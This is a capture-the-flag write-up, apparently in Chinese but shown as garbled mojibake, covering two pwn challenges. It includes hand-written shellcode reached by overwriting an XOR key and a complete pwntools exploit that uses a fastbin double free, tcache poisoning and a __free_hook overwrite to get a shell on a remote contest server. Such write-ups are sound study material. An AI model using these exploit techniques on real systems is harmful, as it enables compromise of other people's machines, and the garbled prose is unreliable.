##### &emsp;&emsp;&emsp;å¯ä»¥çœ‹åˆ°ï¼Œè¯†åˆ«äº†ï¼Œä½†ä¹Ÿæ²¡å®Œå…¨è¯†åˆ«ï¼Œå’Œwikiä¸Šä¸ä¸€æ ·ã€‚<br>&emsp;&emsp;&emsp;è¿™æ˜¯å› ä¸ºx86æœ‰åºå¤§çš„æŒ‡ä»¤é›†ï¼Œè¿™ä¸ªå‡½æ•°å®ç°é€»è¾‘ç•¥æœ‰å¤æ‚ï¼Œæ‰€ä»¥IDAè¯†åˆ«å‡ºç°æ­§ä¹‰ä¹Ÿæ¯”è¾ƒæ­£å¸¸ï¼Œè€Œä¸”IDAä¹Ÿæ²¡æœ‰æ£€æŸ¥åæ±‡ç¼–ç»“æœæ˜¯å¦åˆç†ã€‚è¿™æ—¶å€™å°±éœ€è¦åšä¸€ä¸ªæ‰‹åŠ¨å¼•å¯¼ã€‚<br>
##### &emsp;&emsp;&emsp;å…ˆæ‰“å¼€åŠ¨æ€è°ƒè¯•ï¼ŒåŠ¨æ€è°ƒè¯•ä¸­å¯ä»¥çœ‹åˆ°æ­£ç¡®æ±‡ç¼–ä»£ç ã€‚
![Screenshot 2024-09-28 100307.png](https://www.helloimg.com/i/2024/09/28/66f762523dc6a.png)
##### &emsp;&emsp;&emsp;å¯¹äºè¿™ç§é”™è¯¯è¯†åˆ«çš„æ±‡ç¼–æŒ‡ä»¤ï¼Œæˆ‘ä»¬å³é”®å®ƒï¼Œç‚¹å‡»```Undefine```ï¼Œå¯ä»¥å°†å…¶è¿˜åŸä¸ºå•å­—èŠ‚ã€‚
![Screenshot 2024-09-28 095912.png](https://www.helloimg.com/i/2024/09/28/66f76156df32b.png)
##### &emsp;&emsp;&emsp;å³é”®ç„¶å```Assemble...```ï¼Œå¯ä»¥è°ƒå‡º```Patch```çª—å£ã€‚æ³¨æ„åªæœ‰æ±‡ç¼–æŒ‡ä»¤å¤„æ‰æœ‰è¿™ä¸ªé€‰é¡¹ï¼Œæ‰€æœ‰æŒ‡ä»¤æ‰“å¼€çš„çª—å£éƒ½æ˜¯åŒä¸€ä¸ªã€‚<br>&emsp;&emsp;&emsp;æ­¤æ—¶æˆ‘ä»¬ä»åŠ¨æ€è°ƒè¯•ä¸­å¤åˆ¶ä¸€æ¡æŒ‡ä»¤ï¼Œæ¯”å¦‚é¦–ä¸ªæœªèƒ½æ­£ç¡®è§£æçš„æŒ‡ä»¤```mov    DWORD PTR [rbp-0x24],edi```ï¼Œå°†å®ƒå¤åˆ¶åˆ°```Assembly```çª—å£æ ä¸­ã€‚ç»¿è‰²ä»£è¡¨ä»è¿™ä¸ªä½ç½®å¼€å§‹åŒ¹é…æŒ‡ä»¤ï¼Œç²‰è‰²ä»£è¡¨åŒ¹é…åˆ°äº†æŒ‡ä»¤çš„ä½ç½®ã€‚
![Screenshot 2024-09-28 101130.png](https://www.helloimg.com/i/2024/09/28/66f76443642b4.png)
##### &emsp;&emsp;&emsp;ç„¶åï¼Œå›è½¦å¹¶é€€å‡ºè¿™ä¸ªçª—å£ï¼Œå³é”®åˆšåˆšè§£æ”¾å‡ºæ¥çš„å•å­—èŠ‚ï¼Œç‚¹å‡»```Code```ï¼Œå°±å¯ä»¥çœ‹åˆ°è¿˜åŸæˆåŠŸäº†ã€‚
![Screenshot 2024-09-28 101351.png](https://www.helloimg.com/i/2024/09/28/66f76581f28fe.png)
##### &emsp;&emsp;&emsp;ä½ å¯èƒ½å‘ç°ï¼Œä¸€æ¡æŒ‡ä»¤æ­£ç¡®è¯†åˆ«äº†ï¼Œåˆ«çš„åˆé”™äº†ï¼Œè¿™å¾ˆæ­£å¸¸ã€‚é‡å¤ä¸Šè¿°æ“ä½œï¼Œéœ€è¦æ³¨æ„ï¼Œæœ‰æ—¶å€™ä¸éœ€è¦æ‰‹åŠ¨æ±‡ç¼–åŒ¹é…å³é”®å°±æœ‰```Code```æŒ‰ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ç”¨ä¸€æ¡æŒ‡ä»¤ä¸€æ¡æŒ‡ä»¤åœ°å»åŒ¹é…ã€‚<br> &emsp;&emsp;&emsp;å¼„å®Œäº†ä¹‹åè®°å¾—å’ŒåŠ¨æ€è°ƒè¯•çš„ç»“æœå¯¹æ¯”ä¸€ä¸‹ã€‚<br>
#####  &emsp;&emsp;&emsp;å¯èƒ½æ˜¯ç”±äºæˆ‘IDAçš„é—®é¢˜ï¼Œæ— æ³•æŒ‰ç…§wikiä¸Šçš„æ–¹æ³•åç¼–è¯‘ï¼Œåªèƒ½æ ¹æ®Shinoçš„æç¤ºå…ˆè·³è¿‡è¿™ä¸€æ®µã€‚
![Screenshot 2024-09-28 102447.png](https://www.helloimg.com/i/2024/09/28/66f76752ea2ff.png)
##### &emsp;&emsp;&emsp;ä¸è¿‡è¿™ä¸ªé¢˜åšå®Œäº†ä¹‹åï¼Œè¿˜æ˜¯æ‰¾åˆ°äº†åç¼–è¯‘çš„æ–¹æ³•ï¼ŒæŒºç„å­¦ï¼Œä»…ä¾›å‚è€ƒã€‚<br>&emsp;&emsp;&emsp;å½“ç¡®è®¤åæ±‡ç¼–æ— è¯¯ä¹‹åï¼Œå…ˆä½¿ç”¨```Apply patches to```ä¿®æ”¹äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé€€å‡ºIDAï¼Œåˆ æ‰åŸå…ˆçš„.i64ï¼ˆæˆ–è€…å¹²è„†ä¸æ‰“åŒ…ï¼‰ï¼Œç„¶åå†IDAæ‰“å¼€ä¿®æ”¹åçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå°±å¯ä»¥åç¼–è¯‘äº†ğŸ˜(<br>
##### &emsp;&emsp;&emsp;å›åˆ°æ­£é¢˜ï¼Œè¿™ä¸ªæ¼æ´ç¡®å®ä¸åœ¨åŠ å¯†å‡½æ•°é‡Œã€‚æ³¨æ„åˆ°``` __isoc99_scanf("%s", name);```ï¼Œè¿™ä¸ªä¸œè¥¿å¯ä»¥ç†è§£ä¸ºå’Œ```gets(name)```ä¸€æ ·çš„ä¸œè¥¿ï¼Œä¹Ÿå°±æ˜¯å­˜åœ¨æº¢å‡ºã€‚è¿™é‡Œçš„```name```æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ã€‚
```c
.data:0000000000404070                 public name
.data:0000000000404070 name            db 'DefaultUserName',0  ; DATA XREF: main+93â†‘o
.data:0000000000404080                 public key
.data:0000000000404080 key             db 'Pwn5Shino!',0       ; DATA XREF: main+14Câ†‘o
.data:0000000000404080 _data           ends
.data:0000000000404080
```
##### &emsp;&emsp;&emsp;```name```æ­£å¥½åœ¨å¯†é’¥çš„ä¸Šé¢ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥é€šè¿‡æº¢å‡ºä¿®æ”¹å¯†é’¥ã€‚<br>&emsp;&emsp;&emsp;ç„¶åæ€è€ƒä¿®æ”¹å¯†é’¥æœ‰ä»€ä¹ˆç”¨ï¼Œä¹‹å‰è¯´åˆ°ï¼Œå¯†é’¥ä¸å¯†æ–‡å¯¹åº”å¼‚æˆ–ï¼Œå°±å¯ä»¥å¾—åˆ°åŸæ–‡ï¼Œç„¶åç¨‹åºæ‰§è¡Œè¿™ä¸€æ®µçš„åŸæ–‡ã€‚æ‰€ä»¥è¯´æ§åˆ¶äº†å¯†é’¥ï¼Œå°±æ§åˆ¶äº†è§£å¯†å‡ºæ¥çš„æŒ‡ä»¤ï¼Œç„¶åæ‰§è¡Œæˆ‘ä»¬æ§åˆ¶çš„æŒ‡ä»¤ã€‚<br>&emsp;&emsp;&emsp;é‚£ä¹ˆè¿™å°±å¥½åŠäº†ï¼Œç”±æ•°å­¦å¯çŸ¥ï¼Œä½¿ç”¨å¯†æ–‡å»å¼‚æˆ–æˆ‘ä»¬æƒ³è¦çš„æŒ‡ä»¤ï¼Œå³å¯å¾—åˆ°ç¯¡æ”¹åçš„å¯†é’¥ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªdemoï¼Œæ³¨æ„è¿”å›çš„æ˜¯å­—ç¬¦ä¸²ä¸æ˜¯bytes<br>
```python
def genkey(sh, crypto):
    key = ''
    length = len(sh)
    for i in range(length):
        temp = chr(sh[i] ^ crypto[i])
        key += temp
    return key
# åŸæ–‡é‡Œçš„å‰åä½
crypto10 = b'\xa3\x78\x70\xcf\x06\x20\xe0\x8b\x3c\x69'
```
##### &emsp;&emsp;&emsp;æƒ³æ³•ç¾å¥½ï¼Œä½†ç°å®æ®‹é…·ï¼Œç”±äºæœ¬æ¥çš„å¯†é’¥åªæœ‰10ä½ï¼ŒåŸæ–‡ç´¢å¼•æ¨¡10åæŸ¥è¡¨å¼‚æˆ–ï¼Œæ‰€ä»¥æ— è®ºå¯†é’¥å¦‚ä½•ç¯¡æ”¹ï¼Œå¯ä»¥è‡ªç”±æ”¯é…çš„æŒ‡ä»¤æœ€å¤šåªæœ‰10ä½ã€‚<br>&emsp;&emsp;&emsp; æ˜¾ç„¶10ä½çš„shellcodeä¸è¶³ä»¥```getshell()```ï¼Œæ‰€ä»¥æ ¹æ®ç»éªŒæƒ³åŠæ³•ç”¨è¿™10å­—èŠ‚å¼„ä¸€ä¸ª```read```çš„ç³»ç»Ÿè°ƒç”¨ï¼Œç„¶è€Œè°ƒç”¨ä¸€æ¬¡```read```è‡³å°‘éœ€è¦12å­—èŠ‚ï¼Œå¦‚æœæƒ³è¦æ›´å¤šçš„è¯»å…¥ï¼ŒæŒ‡ä»¤é•¿åº¦ä¹Ÿä¼šå¢é•¿ã€‚
```python
>>> len(asm(shellcraft.read(0, 'rsp', 0x1)))
12
```
##### &emsp;&emsp;&emsp;æ‰€ä»¥è¿™ä¸ªshellcodeè¿˜æ˜¯å¾—æ‰‹å†™ã€‚æ‰‹å†™shellcodeä¸»è¦å…³æ³¨çš„æ˜¯```rax```ã€```rdi```ã€```rsi```ã€```rdx```ï¼Œè¿™å››ä¸ªå¯„å­˜å™¨ï¼Œåˆ†åˆ«æ˜¯ç³»ç»Ÿè°ƒç”¨å·ã€æ–‡ä»¶æµã€è¯»å…¥çš„åœ°å€å’Œè¯»å…¥å­—ç¬¦æ•°é‡ã€‚<br>
##### &emsp;&emsp;&emsp;æ–­ç‚¹ä¸‹è½½è¿›å…¥å‡½æ•°å‰(0x4015db)ï¼ŒåŠ¨æ€è°ƒè¯•ä¸€ä¸‹ï¼Œ
```sh
 RAX  0
 RBX  0
 RCX  0x7ffff7e97887 (write+23) â—‚â€” cmp rax, -0x1000 /* 'H=' */
 RDX  1
 RDI  0
 RSI  1
 R8   0x467
 R9   0x7ffff7fc9040 (_dl_fini) â—‚â€” endbr64 
 R10  0x7ffff7d8b2e0 â—‚â€” 0xf0022000056ec
 R11  0x246
 R12  0x7fffffffdb18 â€”â–¸ 0x7fffffffddd1 â—‚â€” '/home/pwn/worktable/cnss2024/pwn11'
 R13  0x401458 (main) â—‚â€” endbr64  /* 0xe5894855fa1e0ff3 */
 R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) â€”â–¸ 0x401200 (__do_global_dtors_aux) â—‚â€” endbr64  /* 0x2ebd3d80fa1e0ff3 */
 R15  0x7ffff7ffd040 (_rtld_global) â€”â–¸ 0x7ffff7ffe2e0 â—‚â€” 0
 RBP  0x7fffffffda00 â—‚â€” 1
 RSP  0x7fffffffd9f0 â—‚â€” 0x20200001000
 RIP  0x4015db (main+387) â—‚â€” call 0x401236 /* 0xb8fffffc56e8 */
```
##### &emsp;&emsp;&emsp;å¯ä»¥çœ‹åˆ°ï¼Œ```rax```å’Œ```rdi```æ°å¥½éƒ½æ˜¯0ï¼ˆ```read```çš„è°ƒç”¨å·ä»¥åŠ```stdin```ï¼‰ï¼Œè¿™ä¸¤ä¸ªå°±ä¸ç”¨ç®¡äº†ã€‚ä¸»è¦å¼„å‰©ä¸‹ä¸¤ä¸ªã€‚<br>
##### &emsp;&emsp;&emsp;demo1
```python
shellcode1 = '''
    mov rsi, 0x401240 ; 0x401236 + 10
    mov rdx, 0x50
    syscall
'''
>>> len(asm(shellcode1))
16
```
##### &emsp;&emsp;&emsp;æ˜¾ç„¶demo1è‚¯å®šä¸è¡Œäº†ï¼Œè¿™æ˜¯å› ä¸ºsyscallæ˜¯å›ºå®š2å­—èŠ‚ï¼Œè€Œ```mov```å®é™…ä¸Šæ˜¯ä¸€ä¸ªç›¸å½“é•¿çš„æŒ‡ä»¤ï¼Œåœ¨æ„é€ çŸ­shellcodeæ˜¯åº”å°½é‡é¿å…ä½¿ç”¨ï¼Œå°½é‡ä½¿ç”¨```pop```å’Œ```push```æŒ‡ä»¤ï¼Œå°¤å…¶åœ¨ç½®ç©ºå¯„å­˜å™¨æ—¶ï¼Œå¯ä»¥ä½¿ç”¨```xor rax, rax```
##### &emsp;&emsp;&emsp;demo2
```python
shellcode2 = '''
    push 0x401240
    pop rsi
    push 0x50
    pop rdx
    syscall
'''
>>> len(asm(shellcode2))
11
```
##### &emsp;&emsp;&emsp;ç›å¾·æ­£å¥½å¤šä¸€ä¸ª<br>&emsp;&emsp;&emsp;ä»”ç»†åˆ†æä¸€ä¸‹ï¼Œ```rsi```è¦æ±‚å¿…é¡»æ˜¯ä¸€å®šçš„å€¼ï¼Œæ‰€ä»¥å®ƒçš„```pop```å’Œ```push```çœä¸äº†ï¼Œä½†```rdx```ä¸ä¸€æ ·ï¼Œåªè¦æ˜¯ä¸€ä¸ªå¤§æ•°å°±è¡Œã€‚æ³¨æ„åˆ°ï¼Œæ­¤æ—¶ç”±äº```call```æŒ‡ä»¤ï¼Œ```rsp```æŒ‡å‘çš„æ˜¯è¿”å›åœ°å€ï¼ˆ0x4015E0ï¼‰ï¼Œå·²ç»è¶³å¤Ÿå¤§ï¼Œæ‰€ä»¥å°±æŠŠå®ƒçš„```push```ç»™çœæ‰ã€‚
##### &emsp;&emsp;&emsp;demo3
```python
shellcode3 = '''
    pop rdx
    push 0x401240
    pop rsi
    syscall
'''
>>> len(asm(shellcode3))
9
```
##### &emsp;&emsp;&emsp;ç”šè‡³è¿˜å°‘ä¸€å­—èŠ‚ğŸ˜œï¼Œç»“å°¾åŠ ä¸€ä¸ª```nop```å ä½ï¼Œè¿™æ ·å‰é¢ç®—å¯†é’¥çš„å°±ä¸ç”¨å†æ”¹äº†ã€‚
### âš¡ FFFFree!
```
âš  é¢˜ç›®æè¿°
é­”æ³•é“åŒ é“ºçš„ç‹¬ç‰¹ç¬”è®°
æ— è§†ç©ºé—´ï¼Œä½¿ç”¨ç‰¹æ®Šé“¾è¡¨ç›¸äº’è¿æ¥

æ®ä¼ åªéœ€æºå¸¦æ‰‰é¡µ
å³å¯å…¨æ•°æ‚‰çŸ¥ç¬”è®°å†…å®¹

åŒ äººåŸè¯µå’’æ–‡ï¼Œéšè—ç§˜å¯†çš„é¡µç 
åäººå€¾åŠ›ç ”ç©¶
è‡³æš´æ€’ã€è‡³ç™«ç‹‚ã€è‡³å¿˜æˆ‘ã€è‡³æ­»äº¡

è¿˜æˆ‘è‡ªç”±ï¼ä»–ä»¬ç»æœ›åœ°å–Šé“â€¦â€¦

ğŸ’¡ Hint
ğŸ’» é¢˜ç›®é™„ä»¶
ç‚¹å‡»ä¸‹è½½

ğŸš© Flagæ ¼å¼
cnss{meaningful_sentence}

ğŸ”¨ æš´æ‰“å‡ºé¢˜äºº
@Astesia
```
##### &emsp;&emsp;&emsp;ä»‹ç»ä¸€ä¸‹æœ¬é¢˜çš„æ•°æ®ç»“æ„ã€‚æœ¬é¢˜æœ‰å…³å †çš„ç»“æ„æ˜¯ä¸€ä¸ªé“¾è¡¨ï¼Œé“¾è¡¨åˆ†ä¸ºæ§åˆ¶ä¿¡æ¯å’Œæ•°æ®ä¿¡æ¯ã€‚é¦–å…ˆæ§åˆ¶ä¿¡æ¯æœ‰ä¸€ä¸ªå›ºå®šæœ‰ä¸€ä¸ªhead nodeï¼Œç„¶åéšç€é“¾è¡¨çš„æ·»åŠ æ¥ç€æ·»åŠ å…¶ä»–çš„node<br>
##### &emsp;&emsp;&emsp;å¤§æ¦‚æ˜¯ä¸‹é¢ä¸€ä¸ªç»“æ„ï¼ŒæŸä¸ªç»“ç‚¹freeä¹‹åï¼Œidxå°±ä¼šè¢«è®¾ç½®ä¸º```0x7fffffff```è¡¨ç¤ºä¸å¯è¯»ï¼Œä½†æœ¬èº«è¿˜ç•™åœ¨é“¾è¡¨ä¸­ï¼›åœ¨showæ—¶ï¼Œå…ˆä»stdinä¸­è¯»å–ä¸€ä¸ªidxï¼Œç„¶åç”¨```*next```ä¾æ¬¡è®¡æ•°æ‰¾åˆ°é“¾è¡¨ä¸­ç¬¬idxä¸ªç»“ç‚¹ï¼Œ```puts()```å‡º```*text```çš„å†…å®¹ã€‚ä¸€ä¸ªè¿™æ ·çš„æ§åˆ¶ç»“ç‚¹å¤§å°å›ºå®šä¸º```0x18```ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªchunkå›ºå®šä¸º```0x20```<br>&emsp;&emsp;&emsp;ç„¶åæ˜¯```*text```æŒ‡å‘çš„æ•°æ®åŸŸï¼Œä¹Ÿæ˜¯æŒ‡å®šå¤§å°èŒƒå›´```0~0x70```ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªé¢˜å’Œ```unsorted bin```å…³ç³»ä¸å¤§äº†ã€‚<br>&emsp;&emsp;&emsp;
```c
struct node{
    long long idx; // æœ‰æ²¡æœ‰ç¬¦å·ä¸å¤ªè®°å¾—äº†
    struct node *next;
    _BYTE *text;
}
```
##### &emsp;&emsp;&emsp;glibcç‰ˆæœ¬2.31,æ‰€ä»¥æ²¡åŠæ³•æ‰“æœ€åŸå§‹çš„```tcache double free``` ä»¥åŠ ```poisoning```ï¼Œå› ä¸ºä»Ubuntu20.04ï¼ˆä¹Ÿå°±æ˜¯glibc2.31ä¹‹å‰æŸä¸ªç‰ˆæœ¬ï¼Œå¥½åƒ2.28ï¼‰å°±æœ‰å¯¹```tcache double free```çš„æ£€æŸ¥ã€‚<br>&emsp;&emsp;&emsp;é’ˆå¯¹è¿™ä¸ª```double free```çš„æ£€æŸ¥ï¼Œå¯ä»¥é€šè¿‡UAFä¿®æ”¹```tcache chunk```ä¸­çš„```key```å€¼ï¼Œæˆ–è€…é€šè¿‡å †æº¢å‡ºæ”¹```tcache chunk```çš„å¤§å°ç»•è¿‡æ£€æŸ¥ï¼Œä½†æ˜¾ç„¶è¿™ä¸ªé¢˜éƒ½æ²¡æœ‰ã€‚<br>&emsp;&emsp;&emsp;é‚£ä¹ˆè¿˜æœ‰ä¸€ç§ä¸é‚£ä¹ˆå¸¸è§çš„æ–¹æ³•ï¼Œè™½ç„¶glibc2.31æœ‰é’ˆå¯¹```tcache double free```çš„æ£€æŸ¥ï¼Œä½†æ˜¯æ²¡æœ‰å¯¹äº```fastbin```çš„```double free```çš„æ£€æŸ¥ã€‚è™½ç„¶è¿™ä¹ˆè¯´ï¼Œä½†å®é™…ä¸Šè¿˜æ˜¯æœ‰ä¸€äº›é˜²èŒƒæªæ–½ã€‚é¦–å…ˆ```chunk```æ¥å…¥```fastbin```æ—¶ä¼šæ£€æŸ¥```fastbin```æ ˆé¡¶çš„```chunk```ï¼Œå¦‚æœä¸€æ ·å°±ä¼šè¢«æ£€æŸ¥å‡ºæ¥ä¼šæŠ¥```fastbinçš„double free```ï¼›å…¶æ¬¡ï¼Œ```chunk```æ¥å…¥```fastbinæ—¶```ä¼šåœ¨```tcache bin```ä¸­æ£€æŸ¥ï¼Œå¦‚æœå‘ç°å­˜åœ¨ä¸€æ ·åˆ™ä¼šæŠ¥```tcache binçš„double free```ã€‚<br>&emsp;&emsp;&emsp;ç”±äºæ­¤é¢˜æ²¡ç”¨```calloc()```ï¼Œæ‰€ä»¥```malloc()```æ—¶ä¼šå…ˆä»```tcache bin```ä¸­å–å‡º```chunk```ï¼Œç„¶åæŠŠ```fastbin```ä¸­çš„ä¸€ä¸ª```chunk```æŒªåˆ°```tcache bin```ä¸­ï¼Œè¿™ä¸ªæŒªçš„è¿‡ç¨‹ä¸­ä¸å­˜åœ¨```double free```çš„æ£€æŸ¥ï¼Œæ‰€ä»¥è¿™ä¸ªé¢˜è¿˜æ˜¯å¯ä»¥æ‰“ä¸€ä¸ª```tcache poisoning```ä»¥åŠ```__free_hook```ã€‚<br>&emsp;&emsp;&emsp;é¦–å…ˆè€ƒè™‘æ³„éœ²ä¸€ä¸‹libcï¼Œè¿™é‡Œé€‰æ‹©```tcache poisoning```ä»¥åŠ```å †é£æ°´```æŠ€å·§å°†æŸä¸ªæ§åˆ¶ä¿¡æ¯çš„chunkåŠ«æŒåˆ°```free()```çš„gotè¡¨é¡¹ä¸Šï¼Œç„¶åshowå‡ºæ¥å³å¯ã€‚<br>&emsp;&emsp;&emsp;æ³¨æ„åˆ°ï¼Œæƒ³ä¿®æ”¹```*text```ï¼Œè¿˜éœ€è¦å…ˆè¦†ç›–åˆ°```*next```ï¼Œä¸ºäº†è®©é“¾è¡¨æ­£ç¡®åœ°é¡ºåºå¯»å€ï¼Œè¿™ä¸ªé¢˜è¿˜éœ€è¦æ³„éœ²```heap base```ã€‚<br>
##### &emsp;&emsp;&emsp;å¾—åˆ°libcåŸºå€ä¹‹åï¼Œå°±æ˜¯æ„‰å¿«åœ°```tcache poisoning```ä»¥åŠ```__free_hook```äº†ã€‚<br>
##### &emsp;&emsp;&emsp;å®Œæ•´exp
```python
from pwn import *
from os import system
def debug(cmd=''):
    system("gdb --pi={}".format(io.pid))
    pause()
se      = lambda data           : io.send(data)
sl      = lambda data           : io.sendline(data)
sa      = lambda endstr, data   : io.sendafter(endstr, data)
sla     = lambda endstr, data   : io.sendlineafter(endstr, data)
rc      = lambda num=4096       : io.recv(num)
rl      = lambda                : io.recvline()
ru      = lambda endstr         : io.recvuntil(endstr)
info    = lambda tag, addr         : io.info(tag + ': {:#x}'.format(addr))
uu32    = lambda data               :u32(data.ljust(4, b'\0'))
uu64    = lambda data               :u64(data.ljust(8, b'\0'))

context.log_level = 'debug'
# io = process("./pwn")
io = remote("152.136.11.155",30871)
elf = ELF("./pwn")
libc = ELF("./libc-2.31.so")

def add(size, content):
    sla(b'0.Exit.\n>', b'1')
    sla(b'Size?\n>', str(size))
    if context != b'':  
        sa(b'Content?\n>', content)
    sleep(0.01)

def show(idx): # from 1 to ...
    sla(b'0.Exit.\n>', b'2')
    sla(b'ord?\n>', str(idx))
    sleep(0.05)

def free(idx):
    sla(b'0.Exit.\n>', b'3')
    sla(b'ord?\n>', str(idx))
    sleep(0.05)

for i in range(9):
    add(0x10, b'a') # 1~9
for i in range(1,8):
    free(i)
free(8)
add(0x10, b'a') # 10
show(10)
ru(b'10:')
heap_base = uu64(rc(4)) - 0x361
info("heap_base", heap_base)
offset1 = 10

# leak libc
for i in range(12):
    add(0x10, b'd') # 1~11
for i in range(1 + offset1, 8 + offset1):
    free(i) # fill tcache

free(8 + offset1)
free(9 + offset1)
free(10 + offset1)
free(8 + offset1) # fastbin 0x20: 8->10->9->8
free(11 + offset1) # to deplete tcache

for i in range(4):
    add(0x10, b'b') # 12~15 to deplete

add(0x10, b'c') # 17
add(0x18, p64(17 + offset1) + p64(heap_base + 0x6a0) + p64(elf.got['free'])) # 18
show(17 + offset1)
sleep(0.1)
ru(b':')
free_ = uu64(rc(6))
info("_free", free_)

# system
libc_base = free_ - libc.sym["free"]
system_ = libc_base + libc.sym["system"]
__free_hook = libc_base + libc.sym["__free_hook"]

offset2 = 28

# tcache poisioning
for i in range(10):
    add(0x40, b'a')

for i in range(1, 8):
    free(i + offset2) # tcache

free(8 + offset2)
free(9 + offset2)
free(8 + offset2)

for i in range(7):
    add(0x40, b'a') # offset2 + 10 
add(0x40, p64(__free_hook))
add(0x40, b'a')
add(0x40, b'aa')
add(0x40, p64(system_))

info("__free_hook", __free_hook)
info("system", system_)
add(0x30, b'/bin/sh\x00')
free(0x32)
io.interactive()
```